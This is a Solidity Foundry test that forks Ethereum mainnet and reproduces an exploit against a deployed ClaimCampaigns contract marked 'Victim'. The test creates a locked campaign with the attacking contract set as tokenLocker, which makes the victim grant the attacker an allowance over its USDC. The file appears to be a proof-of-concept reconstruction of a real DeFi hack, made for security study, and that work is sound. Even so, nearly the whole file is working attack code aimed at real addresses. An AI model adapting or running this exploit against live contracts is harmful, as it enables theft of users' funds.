// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

import {ClaimCampaigns, IClaimCampaigns} from "./IClaimCampaigns.sol";

IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
// Victim
IClaimCampaigns constant claimCampaigns = IClaimCampaigns(
    0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511
);

contract HedgeTest is Test {
    enum TokenLockup {
        Unlocked,
        Locked,
        Vesting
    }

    uint256 USDCINIT = 1305000 * 1e6;

    function setUp() public {
        vm.createSelectFork("mainnet", 19687890 - 1);
        deal(address(USDC), address(this), USDCINIT);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "init USDC Balance",
            IERC20(USDC).balanceOf(address(this)),
            6
        );
        emit log_named_decimal_uint(
            "allowance USDC",
            IERC20(USDC).allowance(address(claimCampaigns), address(this)),
            6
        );
        emit log_named_decimal_uint(
            "claimCampaigns USDC Balance",
            IERC20(USDC).balanceOf(address(claimCampaigns)),
            6
        );

        USDC.approve(address(claimCampaigns), type(uint256).max);

        ClaimCampaigns.Campaign memory campaign;
        campaign.manager = address(this);
        campaign.token = address(USDC);
        campaign.amount = 1305000000000;
        campaign.end = 3133666800;
        campaign.tokenLockup = uint8(TokenLockup.Locked);
        campaign.root = bytes32(0);

        ClaimCampaigns.ClaimLockup memory claimLockup;
        claimLockup.tokenLocker = address(this);
        claimLockup.start = 0;
        claimLockup.cliff = 0;
        claimLockup.period = 0;
        claimLockup.periods = 0;

        ClaimCampaigns.Donation memory donation;
        donation.tokenLocker = address(this);
        donation.amount = 0;
        donation.rate = 0;
        donation.start = 0;
        donation.cliff = 0;
        donation.period = 0;

        bytes16 id = bytes16("hello");
        claimCampaigns.createLockedCampaign(
            id,
            campaign,
            claimLockup,
            donation
        );

        emit log_named_decimal_uint(
            "allowance USDC",
            USDC.allowance(address(claimCampaigns), address(this)),
            6
        );
    }
}
